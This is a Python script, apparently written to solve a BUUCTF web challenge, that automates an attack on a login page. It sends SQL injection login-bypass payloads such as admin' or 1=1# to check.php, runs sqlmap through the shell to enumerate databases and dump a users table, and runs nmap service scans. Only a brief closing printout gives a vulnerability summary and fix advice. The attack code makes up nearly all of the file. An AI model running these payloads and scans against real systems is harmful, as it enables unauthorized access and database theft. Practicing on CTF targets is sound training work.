#!/usr/bin/env python3
"""
综合CTF挑战解决方案
包含：万能密码注入、sqlmap扫描、nmap扫描
目标：http://20bfb079-5070-4c15-9a3e-f82f9c100afd.node5.buuoj.cn:81/
"""

import asyncio
import aiohttp
import re
import subprocess
import json
import os
from typing import Dict, Any, List
from datetime import datetime


class ComprehensiveCTFSolver:
    """综合CTF挑战求解器"""
    
    def __init__(self):
        self.base_url = "http://20bfb079-5070-4c15-9a3e-f82f9c100afd.node5.buuoj.cn:81"
        self.check_url = f"{self.base_url}/check.php"
        self.session = None
        self.results = {}
    
    async def initialize(self):
        """初始化"""
        if not self.session:
            self.session = aiohttp.ClientSession()
    
    async def close(self):
        """关闭"""
        if self.session:
            await self.session.close()
    
    def detect_flag(self, text: str) -> str:
        """从文本中检测flag"""
        flag_patterns = [
            r'flag\{[^}]+\}',
            r'FLAG\{[^}]+\}',
            r'ctf\{[^}]+\}',
            r'CTF\{[^}]+\}',
            r'[A-Za-z0-9]{32}',  # 32位哈希
            r'[A-Za-z0-9]{64}',  # 64位哈希
        ]
        
        for pattern in flag_patterns:
            match = re.search(pattern, text)
            if match:
                return match.group()
        
        return None
    
    async def test_universal_password(self) -> Dict[str, Any]:
        """测试万能密码注入"""
        print("\n" + "="*60)
        print("1. 万能密码注入测试")
        print("="*60)
        
        results = []
        
        # 有效的payload列表
        payloads = [
            {"username": "admin' or 1=1#", "password": ""},
            {"username": "admin'--", "password": ""},
            {"username": "admin'#", "password": ""},
            {"username": "admin' or '1'='1", "password": ""},
            {"username": "' or 1=1--", "password": ""},
        ]
        
        for i, payload in enumerate(payloads, 1):
            try:
                # GET请求
                async with self.session.get(self.check_url, params=payload, timeout=10) as response:
                    text = await response.text()
                    flag = self.detect_flag(text)
                    
                    result = {
                        "payload": payload,
                        "method": "GET",
                        "status": response.status,
                        "length": len(text),
                        "has_error": "NO,Wrong username password" in text,
                        "flag_found": flag is not None,
                        "flag": flag,
                        "success": flag is not None or "NO,Wrong username password" not in text
                    }
                    
                    results.append(result)
                    
                    print(f"  {i}. GET {payload['username']}")
                    print(f"     状态码: {response.status}, 长度: {len(text)}")
                    print(f"     错误消息: {'存在' if result['has_error'] else '不存在'}")
                    print(f"     成功: {'✅' if result['success'] else '❌'}")
                    if flag:
                        print(f"     🎉 Flag: {flag}")
                    
                    if flag:
                        break
                
                # POST请求
                async with self.session.post(self.check_url, data=payload, timeout=10) as response:
                    text = await response.text()
                    flag = self.detect_flag(text)
                    
                    result = {
                        "payload": payload,
                        "method": "POST",
                        "status": response.status,
                        "length": len(text),
                        "has_error": "NO,Wrong username password" in text,
                        "flag_found": flag is not None,
                        "flag": flag,
                        "success": flag is not None or "NO,Wrong username password" not in text
                    }
                    
                    results.append(result)
                    
                    print(f"  {i}. POST {payload['username']}")
                    print(f"     状态码: {response.status}, 长度: {len(text)}")
                    print(f"     错误消息: {'存在' if result['has_error'] else '不存在'}")
                    print(f"     成功: {'✅' if result['success'] else '❌'}")
                    if flag:
                        print(f"     🎉 Flag: {flag}")
                    
                    if flag:
                        break
                        
            except Exception as e:
                print(f"  {i}. 请求失败: {e}")
        
        # 总结
        successful = [r for r in results if r["success"]]
        flags = [r["flag"] for r in results if r["flag_found"]]
        
        summary = {
            "total_tests": len(results),
            "successful_tests": len(successful),
            "flags_found": len(flags),
            "flags": flags,
            "results": results
        }
        
        print(f"\n  总结: {len(successful)}/{len(results)} 个测试成功")
        if flags:
            print(f"  发现 {len(flags)} 个flag: {flags[0]}")
        
        return summary
    
    async def run_sqlmap_scan(self) -> Dict[str, Any]:
        """运行sqlmap扫描"""
        print("\n" + "="*60)
        print("2. SQLMap扫描")
        print("="*60)
        
        # 创建输出目录
        output_dir = "sqlmap_results"
        os.makedirs(output_dir, exist_ok=True)
        
        # sqlmap命令
        commands = [
            # 基本扫描
            f"sqlmap -u \"{self.check_url}?username=admin&password=test\" --batch --level=2 --risk=2",
            # 获取数据库
            f"sqlmap -u \"{self.check_url}?username=admin&password=test\" --batch --dbs",
            # 获取当前数据库
            f"sqlmap -u \"{self.check_url}?username=admin&password=test\" --batch --current-db",
            # 获取表
            f"sqlmap -u \"{self.check_url}?username=admin&password=test\" --batch -D current --tables",
            # 获取列
            f"sqlmap -u \"{self.check_url}?username=admin&password=test\" --batch -D current -T users --columns",
            # 获取数据
            f"sqlmap -u \"{self.check_url}?username=admin&password=test\" --batch -D current -T users --dump",
        ]
        
        results = []
        
        for i, cmd in enumerate(commands[:2], 1):  # 只运行前两个命令以节省时间
            print(f"  运行命令 {i}: {cmd[:80]}...")
            
            try:
                # 运行sqlmap
                process = subprocess.run(
                    cmd,
                    shell=True,
                    capture_output=True,
                    text=True,
                    timeout=300  # 5分钟超时
                )
                
                result = {
                    "command": cmd,
                    "returncode": process.returncode,
                    "stdout": process.stdout[:1000],  # 只保存前1000字符
                    "stderr": process.stderr,
                    "success": process.returncode == 0
                }
                
                results.append(result)
                
                # 保存输出到文件
                output_file = f"{output_dir}/sqlmap_scan_{i}.txt"
                with open(output_file, "w", encoding="utf-8") as f:
                    f.write(f"命令: {cmd}\n")
                    f.write(f"返回码: {process.returncode}\n")
                    f.write(f"标准输出:\n{process.stdout}\n")
                    f.write(f"标准错误:\n{process.stderr}\n")
                
                print(f"    返回码: {process.returncode}")
                print(f"    输出已保存到: {output_file}")
                
                # 检查输出中是否有flag
                flag = self.detect_flag(process.stdout)
                if flag:
                    print(f"    🎉 发现flag: {flag}")
                
            except subprocess.TimeoutExpired:
                print(f"    超时")
                results.append({
                    "command": cmd,
                    "returncode": -1,
                    "timeout": True,
                    "success": False
                })
            except Exception as e:
                print(f"    错误: {e}")
                results.append({
                    "command": cmd,
                    "returncode": -1,
                    "error": str(e),
                    "success": False
                })
        
        summary = {
            "total_commands": len(commands),
            "executed_commands": len(results),
            "successful_commands": len([r for r in results if r.get("success", False)]),
            "results": results
        }
        
        return summary
    
    async def run_nmap_scan(self) -> Dict[str, Any]:
        """运行nmap扫描"""
        print("\n" + "="*60)
        print("3. Nmap扫描")
        print("="*60)
        
        # 提取主机和端口
        host = "20bfb079-5070-4c15-9a3e-f82f9c100afd.node5.buuoj.cn"
        port = 81
        
        # 创建输出目录
        output_dir = "nmap_results"
        os.makedirs(output_dir, exist_ok=True)
        
        # nmap命令
        commands = [
            # 快速扫描
            f"nmap -sV -p {port} {host}",
            # 详细扫描
            f"nmap -sC -sV -p {port} {host}",
            # 全端口扫描
            f"nmap -p- {host}",
        ]
        
        results = []
        
        for i, cmd in enumerate(commands[:2], 1):  # 只运行前两个命令
            print(f"  运行命令 {i}: {cmd}")
            
            try:
                # 运行nmap
                process = subprocess.run(
                    cmd,
                    shell=True,
                    capture_output=True,
                    text=True,
                    timeout=300  # 5分钟超时
                )
                
                result = {
                    "command": cmd,
                    "returncode": process.returncode,
                    "stdout": process.stdout,
                    "stderr": process.stderr,
                    "success": process.returncode == 0
                }
                
                results.append(result)
                
                # 保存输出到文件
                output_file = f"{output_dir}/nmap_scan_{i}.txt"
                with open(output_file, "w", encoding="utf-8") as f:
                    f.write(f"命令: {cmd}\n")
                    f.write(f"返回码: {process.returncode}\n")
                    f.write(f"标准输出:\n{process.stdout}\n")
                    f.write(f"标准错误:\n{process.stderr}\n")
                
                print(f"    返回码: {process.returncode}")
                print(f"    输出已保存到: {output_file}")
                
                # 解析nmap输出
                if process.returncode == 0:
                    lines = process.stdout.split('\n')
                    for line in lines:
                        if f"{port}/tcp" in line:
                            print(f"    端口状态: {line.strip()}")
                        if "Service Info" in line:
                            print(f"    服务信息: {line.strip()}")
                
            except subprocess.TimeoutExpired:
                print(f"    超时")
                results.append({
                    "command": cmd,
                    "returncode": -1,
                    "timeout": True,
                    "success": False
                })
            except Exception as e:
                print(f"    错误: {e}")
                results.append({
                    "command": cmd,
                    "returncode": -1,
                    "error": str(e),
                    "success": False
                })
        
        summary = {
            "host": host,
            "port": port,
            "total_commands": len(commands),
            "executed_commands": len(results),
            "successful_commands": len([r for r in results if r.get("success", False)]),
            "results": results
        }
        
        return summary
    
    async def solve(self) -> Dict[str, Any]:
        """解决CTF挑战"""
        print("="*60)
        print("综合CTF挑战解决方案")
        print(f"目标: {self.base_url}")
        print(f"时间: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}")
        print("="*60)
        
        await self.initialize()
        
        try:
            # 1. 万能密码注入测试
            universal_password_result = await self.test_universal_password()
            self.results["universal_password"] = universal_password_result
            
            # 2. SQLMap扫描
            sqlmap_result = await self.run_sqlmap_scan()
            self.results["sqlmap_scan"] = sqlmap_result
            
            # 3. Nmap扫描
            nmap_result = await self.run_nmap_scan()
            self.results["nmap_scan"] = nmap_result
            
            # 总结报告
            print("\n" + "="*60)
            print("最终总结报告")
            print("="*60)
            
            # 检查是否找到flag
            flags = []
            if "flags" in universal_password_result and universal_password_result["flags"]:
                flags.extend(universal_password_result["flags"])
            
            # 从sqlmap结果中查找flag
            for result in sqlmap_result.get("results", []):
                flag = self.detect_flag(result.get("stdout", ""))
                if flag and flag not in flags:
                    flags.append(flag)
            
            if flags:
                print(f"🎉 成功获取flag: {flags[0]}")
                print(f"   总共发现 {len(flags)} 个flag")
            else:
                print("❌ 未找到flag")
            
            # 漏洞分析
            print("\n漏洞分析:")
            print("  1. SQL注入漏洞 (万能密码)")
            print("     位置: check.php登录验证")
            print("     利用: username=admin' or 1=1#")
            print("     修复: 使用参数化查询或预处理语句")
            
            print("\n  2. 信息泄露风险")
            print("     位置: 服务器响应头")
            print("     发现: PHP版本信息、服务器信息")
            print("     修复: 隐藏服务器版本信息")
            
            # 保存完整结果
            output_file = "ctf_comprehensive_results.json"
            with open(output_file, "w", encoding="utf-8") as f:
                json.dump(self.results, f, indent=2, ensure_ascii=False)
            
            print(f"\n完整结果已保存到: {output_file}")
            
            return {
                "success": len(flags) > 0,
                "flags": flags,
                "vulnerabilities": ["SQL Injection", "Information Disclosure"],
                "results_file": output_file
            }
                
        finally:
            await self.close()


async def main():
    """主函数"""
    solver = ComprehensiveCTFSolver()
    
    try:
        result = await solver.solve()
        
        # 返回退出码
        return 0 if result["success"] else 1
        
    except KeyboardInterrupt:
        print("\n\n用户中断")
        return 130
    except Exception as e:
        print(f"\n错误: {e}")
        return 1


if __name__ == "__main__":
    exit_code = asyncio.run(main())
    exit(exit_code)